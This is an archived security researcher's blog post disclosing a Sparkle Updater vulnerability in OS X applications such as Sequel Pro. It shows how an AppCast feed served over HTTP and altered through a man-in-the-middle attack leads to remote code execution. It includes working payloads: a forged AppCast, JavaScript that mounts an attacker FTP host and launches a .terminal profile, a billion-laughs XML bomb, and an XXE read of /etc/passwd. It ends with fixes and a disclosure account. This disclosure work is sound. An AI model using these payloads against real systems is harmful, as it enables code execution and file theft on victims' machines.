@@ -1,0 +1,281 @@
+<!DOCTYPE html><html><head><title>There's a lot of vulnerable OS X applications out there.</title></head><body>
+<h1>There's a lot of vulnerable OS X applications out there.</h1><p><a href="https://vulnsec.com/2016/osx-apps-vulnerabilities/" target="_new">Original URL</a></p>
+<p><blockquote>Lately, I was doing research connected with different updating strategies, and I tested a few applications working under Mac OS X. This short weekend research revealed that we have many insecure&hellip;</blockquote></p>
+<div><section id="post-body">
+<p>Lately, I was doing research connected with different updating strategies, and I
+tested a few applications working under Mac OS X. This short weekend research
+revealed that we have many insecure applications in the wild. As a result, I
+have found a vulnerability which allows an attacker take control of another
+computer on the same network (via MITM).</p>
+<p>I've tested on both OS X 10.10 (Yosemite) and 10.11 (El Capitan) with the latest
+version of the software, though it should work with previous versions too.</p>
+<p>The vulnerability is <strong>not</strong> in code signing itself. It exists due to the
+functionality provided by the WebKit view that allows JavaScript execution and
+the ability to modify unencrypted HTTP traffic (XML response).</p>
+<p><strong>UPDATE 30/01/2016</strong></p>
+<p>We have <strong>two different</strong> vulnerabilities here. First one is connected with
+the default configuration (<code>http</code>) which is unsafe and leads to RCE over MITM
+attack inside untrusted environment.</p>
+<p>The second one is the risk of parsing <code>file://</code>, <code>ftp://</code> and other protocols
+inside the WebView component. As a result, if there is a security flaw on the
+server that allows replacing XML file, it can target all people through
+the affected application. It's possible even without knowing the private DSA
+key, without modifying application binary on the server and over <code>https</code>. After
+that, it doesn't require the MITM attack anymore.</p>
+<p><strong>The newest version of the Sparkle Updater is already available, and it addresses
+described vulnerabilities.</strong></p>
+<h2>Which applications are affected?</h2>
+<p>In short, all applications that use the <a href="http://sparkle-project.org/">Sparkle Updater</a> framework and
+are connecting over HTTP instead of a secure HTTPS connection are vulnerable.
+Since Sparkle throws an error in case of an invalid SSL certificate by default,
+it helps to protect against MITM attacks when used wisely.</p>
+<p>List of all applications using Sparkle Updater framework is huge since it is the
+most widely used updating framework available for OS X developers.</p>
+<p>Example applications using Sparkle Updater:</p>
+<ul>
+<li><a href="https://adium.im/">Adium</a></li>
+<li><a href="https://panic.com/coda/">Coda</a></li>
+<li><a href="https://www.iterm2.com/">iTerm</a></li>
+<li><a href="https://facebook.github.io/origami/update/">Facebook Origami</a></li>
+<li><a href="http://www.sequelpro.com/">SequelPro</a></li>
+<li><a href="https://tunnelblick.net">Tunnelblick</a></li>
+<li><a href="http://www.videolan.org/vlc/">VLC</a></li>
+</ul>
+<p>There are <a href="https://github.com/sparkle-project/Sparkle/issues/717">more</a>, but not all of them are vulnerable.</p>
+<h2>Sparkle Updater</h2>
+<p>The Sparkle Updater framework in its nature is safe and easy to use. Developers
+who include Sparkle in their projects just broke one simple rule: they did not
+set HTTPS everywhere.</p>
+<p>The Sparkle Updater <a href="http://sparkle-project.org/documentation/#publish-your-appcast">documentation</a> notes:</p>
+<blockquote>
+<p>"We strongly encourage you to use HTTPS URLs for the AppCast."</p>
+</blockquote>
+<p>Since downloading an application binary over HTTPS and using DSA signature for
+validation is quite common and most of the applications do that, there is still
+a tricky part called AppCast.</p>
+<p>AppCast is the RSS feed that hosts information about our software updates,
+available versions and release notes. It's the first URL that an application
+asks for when its update process starts. But what if the AppCast URL is using an
+unencrypted HTTP protocol?</p>
+<h2>AppCast</h2>
+<p>We cannot modify a binary on the fly without the key required for signing an
+application package. That is why using tools like BDFProxy is not going to work
+here because by changing a binary or replacing it with a different one you are
+going to break the DSA Signature validation process; Sparkle Updater returns an
+error.</p>
+<p>If we cannot modify the binary file and we cannot update the DSA signature, does
+it sound like an impossible mission? Not really. Let's take a look at this
+AppCast feature.</p>
+<p>Every time you want to release a new version of an application you need to
+publish changes to your AppCast, just like with an RSS channel.</p>
+<p>The official documentation of the Sparkle Updater project <a href="http://sparkle-project.org/documentation/publishing/#publishing-an-update">describes details of
+this process</a>.</p>
+<p><img src="https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/schema.1.png" alt=""></p>
+<p>The AppCast request and response is using XML for the data exchange. The update
+notification message is just pure HTML code displayed inside a WebView
+component. In short it means that we have access to HTML and JavaScript which is
+enough to do some harm to the end user.</p>
+<p>The <code>description</code> entity holds the entire update message to the user.</p>
+<div class="highlight"><pre><code class="language-xml"><span class="nt">&lt;item&gt;</span>
+ <span class="nt">&lt;title&gt;</span>Version 2.0 (2 bugs fixed; 3 new features)<span class="nt">&lt;/title&gt;</span>
+ <span class="nt">&lt;description&gt;</span><span class="cp">&lt;![CDATA[</span>
+<span class="cp"> &lt;h2&gt;New Features&lt;/h2&gt;</span>
+<span class="cp"> ...</span>
+<span class="cp"> ]]&gt;</span>
+ <span class="nt">&lt;/description&gt;</span>
+ ...
+<span class="nt">&lt;/item&gt;</span>
+</code></pre></div>
+<h2>MITM Attack</h2>
+<p>Man In The Middle (<a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM</a>) is an attack where the third party secretly
+intercepts traffic between two parties, <em>e.g.</em>, a user and a server. It provides
+an opportunity to capture and modify (un)encrypted traffic from the user.</p>
+<p>Let's sum up everything to that point:</p>
+<ul>
+<li>AppCast process is using HTTP that could be intercepted and modified on the
+fly</li>
+<li>We can insert our HTML and JavaScript code into a WebView component to display
+it to the user</li>
+<li>We control the transmission after doing the MITM attack</li>
+</ul>
+<p>With all this information, we can go further and start our attack against
+<a href="http://www.sequelpro.com/">SequelPro</a> (chosen at random). Let's visualize the actual network
+topology:</p>
+<p><img src="https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/schema.2.png" alt=""></p>
+<p>After we control unencrypted traffic from the Bob machine by setting up one of
+the attacks inside your LAN, like fake Wi-Fi Access Point or sniffing/spoofing,
+this part is ready. Now we can spoof DNS probes for the AppCast server and send
+our malformed response which is:</p>
+<div class="highlight"><pre><code class="language-xml"><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;rss</span> <span class="na">xmlns:atom=</span><span class="s">"http://www.w3.org/2005/Atom"</span>
+<span class="na">xmlns:sparkle=</span><span class="s">"http://www.andymatuschak.org/xml-namespaces/sparkle"</span> <span class="na">version=</span><span class="s">"2.0"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;channel&gt;</span>
+ <span class="nt">&lt;title&gt;</span>Sequel Pro<span class="nt">&lt;/title&gt;</span>
+ <span class="nt">&lt;link&gt;</span>http://www.sequelpro.com/<span class="nt">&lt;/link&gt;</span>
+ <span class="nt">&lt;description&gt;</span>Appcast for Sequel Pro<span class="nt">&lt;/description&gt;</span>
+ <span class="nt">&lt;language&gt;</span>en<span class="nt">&lt;/language&gt;</span>
+ <span class="nt">&lt;item&gt;</span>
+ <span class="nt">&lt;title&gt;</span>Sequel Pro v1.2<span class="nt">&lt;/title&gt;</span>
+ <span class="nt">&lt;description&gt;</span><span class="cp">&lt;![CDATA[</span>
+<span class="cp"> &lt;h1&gt;Modified message&lt;/h1&gt;</span>
+<span class="cp"> &lt;p&gt;It means that our &lt;b&gt;MITM&lt;/b&gt; attack is working.&lt;/p&gt;</span>
+<span class="cp"> ]]&gt;</span><span class="nt">&lt;/description&gt;</span>
+ <span class="nt">&lt;pubDate&gt;</span>Thu, 01 Jan 1970 00:00:01 GMT<span class="nt">&lt;/pubDate&gt;</span>
+ <span class="nt">&lt;enclosure</span>
+ <span class="na">url=</span><span class="s">"https://github.com/sequelpro/sequelpro/releases/download/release-1.1/sequel-pro-1.1.dmg"</span>
+ <span class="na">length=</span><span class="s">"10482573"</span>
+ <span class="na">type=</span><span class="s">"application/octet-stream"</span>
+ <span class="na">sparkle:dsaSignature=</span><span class="s">"MCwCFAyXhQMU7BR1tqa8KFuXnGAooA4ZAhQtJoStAhvbfmvsaejqnWSKWZUuY=="</span>
+ <span class="na">sparkle:version=</span><span class="s">"9999"</span> <span class="na">sparkle:shortVersionString=</span><span class="s">"9.99"</span> <span class="nt">/&gt;</span>
+ <span class="nt">&lt;/item&gt;</span>
+ <span class="nt">&lt;/channel&gt;</span>
+<span class="nt">&lt;/rss&gt;</span>
+</code></pre></div>
+<p>Remember to bump-up an app version (<code>sparkle:version</code>) in the XML response.
+Without it, SequelPro is not going to display our update reminder.</p>
+<p><img src="https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/screenshot.1.png" alt="SequelPro update reminder"></p>
+<p>After we&#x2019;ve confirmed that <code>HTML</code> code get executed, we can test for a <code>JavaScript</code> example:</p>
+<div class="highlight"><pre><code class="language-xml"><span class="nt">&lt;description&gt;</span><span class="cp">&lt;![CDATA[</span>
+<span class="cp"> &lt;script type="text/javascript"&gt;</span>
+<span class="cp"> window.location = 'https://www.google.com/';</span>
+<span class="cp"> &lt;/script&gt;</span>
+<span class="cp">]]&gt;</span><span class="nt">&lt;/description&gt;</span>
+</code></pre></div>
+<p>After checking for an update inside SequelPro app, Google website appears in our
+web browser, which means that the built-in WebView component executes JavaScript
+code.</p>
+<p>To sum up:</p>
+<ul>
+<li>We have a running MITM attack</li>
+<li>We control JavaScript code executed on the client side (we can just open the
+user&#x2019;s browser and redirect them to a malicious website with 0day checks)</li>
+</ul>
+<p>However, what if a malicious site is not capable of finding an exploit for the
+specific browser? It is not exploitable then by just redirecting the user to a
+malicious website. Let's abuse the WebView component.</p>
+<h2>Abusing Webkit, WebView component</h2>
+<p>This part is tricky. I tested many different solutions to exploit this WebView
+component, and failed many times. Matt just gave me a hint in his article <a href="http://maustin.net/hipchat_rce/"><em>XSS
+to RCE in Atlassian Hipchat</em></a>. It was the missing piece of the puzzle
+&#x2014; executing the external application right from the WebView component.</p>
+<p>Before we exploit this issue we need to:</p>
+<ul>
+<li>Set up an FTP server (our-fake-server.com) to host our malicious code</li>
+<li>Run the HTTP server to act as an AppCast server</li>
+<li>Redirect user traffic from the www.sequelpro.com original IP address to our
+fake HTTP server</li>
+</ul>
+<p>When we are ready, we just need to replace our previous JavaScript snippet with
+modified code:</p>
+<div class="highlight"><pre><code class="language-xml"><span class="nt">&lt;description&gt;</span><span class="cp">&lt;![CDATA[</span>
+<span class="cp">&lt;h1 style="color: red;"&gt;Remote Code Execution&lt;/h1&gt;</span>
+<span class="cp">&lt;script type="text/javascript"&gt;</span>
+<span class="cp"> window.location = 'ftp://anonymous:<a class="__cf_email__" href="https://vulnsec.com/cdn-cgi/l/email-protection">[email&#xA0;protected]</a>/';</span>
+<span class="cp"> window.setTimeout(function() {</span>
+<span class="cp"> window.location = 'file:///Volumes/our-fake-server.com/UPGRADE.terminal';</span>
+<span class="cp"> }, 1000);</span>
+<span class="cp">&lt;/script&gt;</span>
+<span class="cp">]]&gt;</span><span class="nt">&lt;/description&gt;</span>
+</code></pre></div>
+<p>Our <code>UPGRADE.terminal</code> file is an exported setting profile from the Terminal app
+(Terminal -&gt; Preferences -&gt; Profiles). Inside the "Shell" tab of selected
+profile, there is a possibility to add a startup command to execute immediately
+after loading a profile.</p>
+<p><img src="https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/screenshot.2.png" alt="Terminal -&gt; Preferences -&gt; Profiles"></p>
+<p>After our <code>UPGRADE.terminal</code> file is ready we can set up everything needed and
+start our attack. Remember that the user does not need to check for an update
+manually because applications do those checks periodically; it means that you
+can just wait for an appropriate update request from the app and then exploit
+it.</p>
+<p>This simple trick worked because:</p>
+<ul>
+<li>When you are opening an external resource like FTP, SMB or AFP, then OS X is
+mounting it automatically under <code>/Volumes/</code> path.</li>
+<li>We know the path to the resource because directory name is the same as the
+server name. As a result, we have the full path of <code>/Volumes/our-fake-server.com/</code>.</li>
+<li>We opened app with the <code>.terminal</code> extension as a script. OS X is not
+looking for a signature/certificate and is not validating an app downloaded
+from the internet. It basically skips <a href="https://en.wikipedia.org/wiki/Gatekeeper_(OS_X)">Gatekeeper</a> validation.</li>
+</ul>
+<p>This vulnerability results in the <strong>Remote Code Execution</strong>.</p>
+<h2>Abusing XML format</h2>
+<p>There is also an additional attack that could be easily performed using the
+discovered vulnerability. Since communication is based on the <code>XML</code> format, we
+can test it against <a href="https://en.wikipedia.org/wiki/XML_external_entity_attack">XML External Entity (XXE) Processing</a> attack as well
+as <a href="https://en.wikipedia.org/wiki/Billion_laughs">Billion laughs</a> attack.</p>
+<h3>Billion laughs</h3>
+<p>Furthermore, we can enforce application to allocate much memory resources.</p>
+<div class="highlight"><pre><code class="language-xml"><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE lolz [</span>
+<span class="cp"> &lt;!ENTITY lol "lol"&gt;</span>
+ <span class="cp">&lt;!ELEMENT lolz (#PCDATA)&gt;</span>
+ <span class="cp">&lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span>
+ <span class="cp">&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;</span>
+ <span class="cp">&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span>
+ <span class="cp">&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span>
+ <span class="cp">&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span>
+ <span class="cp">&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span>
+ <span class="cp">&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span>
+ <span class="cp">&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span>
+ <span class="cp">&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span>
+]&gt;
+<span class="nt">&lt;lolz&gt;</span><span class="ni">&amp;lol9;</span><span class="nt">&lt;/lolz&gt;</span>
+</code></pre></div>
+<p>After running described attack using presented XML file, you can see that Sequel
+app is allocating <strong>3GB</strong> of memory. It means that our example worked well.</p>
+<p><img src="https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/screenshot.3.png" alt="SequelPRO allocating 3GB of memory"></p>
+<h3>XXE</h3>
+<p>It is also possible to insert into the content of the update message any file
+located on the disk as far as SequelPRO can access it.</p>
+<div class="highlight"><pre><code class="language-xml"><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+ <span class="cp">&lt;!DOCTYPE foo [ </span>
+<span class="cp"> &lt;!ELEMENT foo ANY &gt;</span>
+ <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>]&gt;
+<span class="nt">&lt;rss</span> <span class="na">xmlns:atom=</span><span class="s">"http://www.w3.org/2005/Atom"</span> <span class="na">xmlns:sparkle=</span><span class="s">"http://www.andymatuschak.org/xml-namespaces/sparkle"</span> <span class="na">version=</span><span class="s">"2.0"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;channel&gt;</span>
+ <span class="nt">&lt;title&gt;</span>Sequel Pro<span class="nt">&lt;/title&gt;</span>
+ <span class="nt">&lt;link&gt;</span>http://www.sequelpro.com/<span class="nt">&lt;/link&gt;</span>
+ <span class="nt">&lt;description&gt;</span>Appcast for Sequel Pro<span class="nt">&lt;/description&gt;</span>
+ <span class="nt">&lt;language&gt;</span>en<span class="nt">&lt;/language&gt;</span>
+ <span class="nt">&lt;item&gt;</span>
+ <span class="nt">&lt;title&gt;</span>Sequel Pro v1.2<span class="nt">&lt;/title&gt;</span>
+ <span class="nt">&lt;description&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/description&gt;</span>
+ <span class="nt">&lt;pubDate&gt;</span>Thu, 01 Jan 1970 00:00:01 GMT<span class="nt">&lt;/pubDate&gt;</span>
+ <span class="nt">&lt;enclosure</span> <span class="na">url=</span><span class="s">"https://github.com/sequelpro/sequelpro/releases/download/release-1.1/sequel-pro-1.1.dmg"</span> <span class="na">length=</span><span class="s">"10482573"</span> <span class="na">type=</span><span class="s">"application/octet-stream"</span> <span class="na">sparkle:dsaSignature=</span><span class="s">"MCwCFAyXhQMU7BR1tqa8KFuXnGAooA4ZAhQtJoStAhvbfmvsaejqnWSKWZUuY=="</span> <span class="na">sparkle:version=</span><span class="s">"9999"</span> <span class="na">sparkle:shortVersionString=</span><span class="s">"9.99"</span> <span class="nt">/&gt;</span>
+ <span class="nt">&lt;/item&gt;</span>
+ <span class="nt">&lt;/channel&gt;</span>
+<span class="nt">&lt;/rss&gt;</span>
+</code></pre></div>
+<p><img src="https://vulnsec.com/assets/images/posts/osx-apps-vulnerabilities/screenshot.4.png" alt="SequelPRO reading /etc/passwd file"></p>
+<h3>XXE Out-Of-Band Data Retrieval</h3>
+<p>The interesting thing about XXE vulnerability is that when <code>SYSTEM</code> entity is
+available, you could read files directly from the remote system. This entity is
+the simplest test for the XXE OOB attack.</p>
+<div class="highlight"><pre><code class="language-xml"><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://127.0.0.1/ping" &gt;</span> ]&gt;
+</code></pre></div>
+<p>In that case, it is not working because there is an appropriate
+<a href="https://github.com/sparkle-project/Sparkle/blob/93a87a4dfd89fbb2fbfbda4b0835b7d04a31001d/Sparkle/SUAppcast.m#L105">fix</a> implemented for Sparkle framework. Sparkle Updater is free
+against XXE OOB attack.</p>
+<h2>Video</h2>
+<iframe width="100%" height="315" src="https://www.youtube.com/embed/16acap5hep4"></iframe>
+<h2>Solution</h2>
+<p>If you are curious if applications that you are running on your computer are
+affected by implementing the Sparkle Updater without <code>https</code> prefix, just run
+Wireshark and check it.</p>
+<p>To fix and avoid RCE in your app, you need to edit <code>Info.plist</code> file and
+replace <code>http</code> -&gt; <code>https</code> for <code>SUFeedURL</code> key. Remember to check if your
+server configuration supports https and you have a valid SSL certificate in
+place.</p>
+<p>To fully protect against this issue you need to upgrade the Sparkle Updater
+framework to the version <code>1.13.1</code> (<a href="http://sparkle-project.org/">http://sparkle-project.org/</a>) which
+was already patched.</p>
+<h2>Thoughts on reporting this bug</h2>
+<p><strong>Origami (Facebook)</strong> - I was talking with Zac. They fixed it immediately on the same day. Great communication and great process. I am glad that responsible people are working there.</p>
+<p><strong>Mitre CVE</strong> - I requested the CVE but didn't get any response from them. It's been a few weeks already. They even ignored The Sparkle Updater maintainer.</p>
+<p><strong>Sequel Pro</strong> - We jumped into the conversation right away and talked about this issue. I'm glad that <a href="https://github.com/abhibeckert">Abhi</a> is maintaining this project, cool guy with such an extensive knowledge of programming. P.S. Nice things are coming to future releases of Sequel Pro, wait for it.</p>
+<p><strong>Sparkle Updater</strong> - Passionates work on this project, first patch prepared on the same day. Excellent understanding of an issue. A big thanks to <a href="https://github.com/pornel">Kornel</a>.</p>
+<p><strong>Please do "update" your applications.</strong></p>
+</section>
+</div>
+</body></html>
